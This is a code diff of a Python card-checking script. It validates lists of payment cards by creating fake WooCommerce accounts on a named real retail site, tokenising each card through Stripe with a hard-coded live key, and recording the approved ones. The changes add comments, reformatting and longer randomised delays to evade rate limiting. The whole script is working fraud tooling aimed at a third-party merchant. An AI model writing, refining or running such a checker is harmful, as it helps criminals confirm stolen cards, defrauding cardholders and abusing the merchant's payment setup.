@@ -8,6 +8,7 @@ from faker import Faker
 
 fake = Faker()
 BASE_URL = "https://www.propski.co.uk"
+# Updated Public Key from Stripe_Auth(New).py
 STRIPE_PK = "pk_live_4kM0zYmj8RdKCEz9oaVNLhvl00GpRole3Q"
 
 def read_cc_file(filename):
@@ -39,6 +40,7 @@ def save_approved_card(card_details):
         print(f"Error saving approved card: {e}")
 
 def get_session():
+    """Initializes a session with the necessary User-Agent."""
     s = requests.Session()
     s.headers.update({
         'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36'
@@ -46,14 +48,15 @@ def get_session():
     return s
 
 def setup_account(session):
-    """Combines registration and billing address setup."""
+    """Handles registration and billing setup to authorize the session."""
     email = f"{fake.first_name().lower()}{random.randint(100,999)}@gmail.com"
-    print(f"Setting up account with: {email}")
+    print(f"Initializing Session... Email: {email}")
 
-    # 1. Register
+    # 1. Registration
     r_page = session.get(f"{BASE_URL}/my-account/")
     reg_nonce = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', r_page.text)
-    if not reg_nonce: return None, None
+    if not reg_nonce: 
+        return None, None
     
     reg_data = {
         'email': email,
@@ -63,10 +66,11 @@ def setup_account(session):
     }
     session.post(f"{BASE_URL}/my-account/", data=reg_data)
 
-    # 2. Post Billing
+    # 2. Billing Address
     addr_page = session.get(f"{BASE_URL}/my-account/edit-address/billing/")
     addr_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', addr_page.text)
-    if not addr_nonce: return None, None
+    if not addr_nonce: 
+        return None, None
 
     billing_data = {
         'billing_first_name': fake.first_name(),
@@ -84,14 +88,19 @@ def setup_account(session):
     }
     session.post(f"{BASE_URL}/my-account/edit-address/billing/", data=billing_data)
 
-    # 3. Get Add Payment Nonce
+    # 3. Add Payment Method Nonce (Crucial for confirmation)
     pay_page = session.get(f"{BASE_URL}/my-account/add-payment-method/")
     add_nonce = re.search(r'"add_card_nonce"\s*:\s*"([^"]+)"', pay_page.text)
     
     return email, add_nonce.group(1) if add_nonce else None
 
 def create_payment_method(card_details, email):
-    headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Origin': 'https://js.stripe.com'}
+    """Creates a Stripe source/payment method."""
+    headers = {
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Origin': 'https://js.stripe.com',
+        'Referer': 'https://js.stripe.com/'
+    }
     data = {
         'type': 'card',
         'owner[email]': email,
@@ -106,57 +115,73 @@ def create_payment_method(card_details, email):
         if resp.status_code == 200:
             return resp.json().get('id')
     except Exception as e:
-        print(f"Stripe Error: {e}")
+        print(f"Stripe Tokenization Error: {e}")
     return None
 
 def confirm_on_site(session, pmid, nonce):
+    """Attaches the card to the account via the site's AJAX handler."""
     params = {'wc-ajax': 'wc_stripe_create_setup_intent'}
     data = {'stripe_source_id': pmid, 'nonce': nonce}
     try:
         r = session.post(f"{BASE_URL}/", params=params, data=data)
         if r.status_code == 200:
             res = r.json()
+            # New logic: Check if status is success
             return res.get('status') == 'success', res
     except:
         pass
     return False, {}
 
 def check_card(card_details, session, email, nonce):
-    print(f"\nChecking: {card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}")
+    """Main verification flow."""
+    print(f"\n{'='*50}")
+    print(f"Checking card: {card_details['number']}|{card_details['exp_month']}|{card_details['exp_year']}")
+    print(f"{'='*50}")
     
     pmid = create_payment_method(card_details, email)
     if not pmid:
-        print("Failed to create Stripe Source")
+        print("Failed: Unable to contact Stripe.")
         return False
     
     success, response = confirm_on_site(session, pmid, nonce)
+    
     if success:
-        print("✅ Approved!")
+        print("RESULT: ✅ Approved")
         save_approved_card(card_details)
         return True
     else:
-        err_msg = response.get('error', {}).get('message', 'Declined')
-        print(f"❌ {err_msg}")
+        # Extract error message if available
+        err_msg = response.get('error', {}).get('message', 'Declined/Error')
+        print(f"RESULT: ❌ {err_msg}")
         return False
 
 if __name__ == "__main__":
-    if os.path.exists('approved.txt'): os.remove('approved.txt')
+    if os.path.exists('approved.txt'): 
+        os.remove('approved.txt')
+    
     cards = read_cc_file('cc.txt')
     
     if not cards:
-        print("No cards found.")
+        print("No cards found in cc.txt")
     else:
-        print(f"Found {len(cards)} cards. Initializing session...")
+        print(f"Found {len(cards)} cards. Starting...")
+        # Create persistent session
         s = get_session()
-        email, action_nonce = setup_account(s)
+        # Initialize account once per session
+        email_addr, action_nonce = setup_account(s)
         
         if not action_nonce:
-            print("Failed to initialize site session.")
+            print("Failed to initialize session. Site may be down or nonces changed.")
         else:
             approved_count = 0
             for i, card in enumerate(cards, 1):
-                if check_card(card, s, email, action_nonce):
+                print(f"\nProcessing {i}/{len(cards)}")
+                if check_card(card, s, email_addr, action_nonce):
                     approved_count += 1
-                time.sleep(random.uniform(5, 8)) # Anti-spam delay
+                
+                # Randomized sleep to avoid rate limiting
+                time.sleep(random.uniform(7, 10))
             
-            print(f"\nDone: {approved_count}/{len(cards)} approved.")
+            print(f"\n{'='*50}")
+            print(f"Done: {approved_count}/{len(cards)} approved")
+            print(f"{'='*50}")
